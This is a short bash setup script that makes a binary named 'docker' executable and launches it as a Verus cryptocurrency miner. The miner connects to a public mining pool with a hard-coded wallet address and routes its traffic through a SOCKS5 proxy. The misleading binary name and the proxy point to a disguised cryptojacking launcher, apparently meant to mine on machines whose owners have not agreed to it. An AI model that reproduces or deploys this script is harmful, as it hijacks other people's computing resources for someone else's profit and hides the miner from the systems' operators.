#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
PROXY=socks5://70.185.68.133:4145
./docker -a verus -o $POOL -u $WALLET.P4 -p x -t 2 -x $PROXY
